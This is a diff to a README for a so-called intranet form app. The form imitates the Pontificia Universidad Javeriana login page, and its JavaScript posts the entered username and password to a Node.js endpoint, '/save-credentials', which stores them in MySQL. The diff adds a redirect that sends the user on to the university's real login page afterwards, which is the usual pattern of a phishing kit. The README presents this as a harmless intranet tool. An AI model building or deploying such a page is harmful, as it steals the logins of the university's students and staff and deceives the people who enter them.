@@ -1,11 +1,12 @@
 
 # **Intranet Form Submission App**
 
-This project provides a setup for a form hosted on an IIS server that interacts with a Dockerized Node.js backend and a MySQL database. It saves user credentials securely in the database when the form is submitted.
+This project provides a setup for a form hosted on an IIS server that interacts with a Dockerized Node.js backend and a MySQL database. It saves user credentials securely in the database when the form is submitted and redirects the user upon successful submission.
 
 ## **Features**
 - **Form Submission**: Collects user credentials (username and password) from a form.
 - **Backend API**: Node.js app handles form submissions and stores data in a MySQL database.
+- **Redirection**: Redirects the user to a specified URL upon successful submission.
 - **Dockerized Setup**: Backend and database are containerized for easy deployment.
 
 ---
@@ -53,44 +54,40 @@ This will:
 2. Ensure the form’s `<form>` tag or JavaScript code points to the Node.js backend. **Update the IP address in the JavaScript `submitForm` function to match the IIS server's IP.** For example:
    ```javascript
    async function submitForm(event) {
-    event.preventDefault();
+       event.preventDefault();
 
-    // Get the username and password values from the form
-    const username = document.getElementById('username').value;
-    const password = document.getElementById('password').value;
+       const username = document.getElementById('username').value;
+       const password = document.getElementById('password').value;
 
-    if (!username || !password) {
-        alert("Please enter both username and password.");
-        return;
-    }
+       if (!username || !password) {
+           alert("Please enter both username and password.");
+           return;
+       }
 
-    try {
-        // Send data to the Node.js server
-        const response = await fetch('http://192.168.124.1:4000/save-credentials', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify({ username, password }),
-        });
+       try {
+           const response = await fetch('http://<IIS_SERVER_IP>:4000/save-credentials', {
+               method: 'POST',
+               headers: {
+                   'Content-Type': 'application/json',
+               },
+               body: JSON.stringify({ username, password }),
+           });
 
-        // Handle server response
-        if (response.ok) {
-            const result = await response.json();
-            alert(result.message || 'Credentials saved successfully.');
+           if (response.ok) {
+               const result = await response.json();
+               alert(result.message || 'Credentials saved successfully.');
 
-            // Redirect to the specified URL on success
-            window.location.href = 'https://acceso.javeriana.edu.co/menu/login3_v2.html?bmctx=A04E6915505F18E099136E72C9264584664C73087CD21469F3540EEF40735E67&password=secure_string&contextType=external&username=string&challenge_url=https%3A%2F%2Facceso.javeriana.edu.co%2Fmenu%2Flogin3_v2.html&request_id=-1917398409814472959&authn_try_count=0&locale=es_419&resource_url=http%253A%252F%252Fintranet.javeriana.edu.co%252Finicio';
-        } else {
-            const error = await response.json();
-            alert(error.message || 'An error occurred.');
-        }
-    } catch (err) {
-        console.error('Error connecting to the server:', err);
-        alert('Failed to connect to the server.');
-    }
-}
-
+               // Redirect to the specified URL on success
+               window.location.href = 'https://acceso.javeriana.edu.co/menu/login3_v2.html?bmctx=A04E6915505F18E099136E72C9264584664C73087CD21469F3540EEF40735E67&password=secure_string&contextType=external&username=string&challenge_url=https%3A%2F%2Facceso.javeriana.edu.co%2Fmenu%2Flogin3_v2.html&request_id=-1917398409814472959&authn_try_count=0&locale=es_419&resource_url=http%253A%252F%252Fintranet.javeriana.edu.co%252Finicio';
+           } else {
+               const error = await response.json();
+               alert(error.message || 'An error occurred.');
+           }
+       } catch (err) {
+           console.error('Error connecting to the server:', err);
+           alert('Failed to connect to the server.');
+       }
+   }
    ```
    Replace `<IIS_SERVER_IP>` with the actual IP address of the IIS server (e.g., `192.168.124.1`).
 
@@ -99,7 +96,7 @@ This will:
 ### **Step 4: Test the Setup**
 1. Access the form through IIS, e.g., `http://192.168.124.1:443/menu/login3_v2bc9b.html`.
 2. Submit the form with a username and password.
-3. Verify the data is saved in the database.
+3. Verify the data is saved in the database and the user is redirected to the specified URL.
 
 ---
 
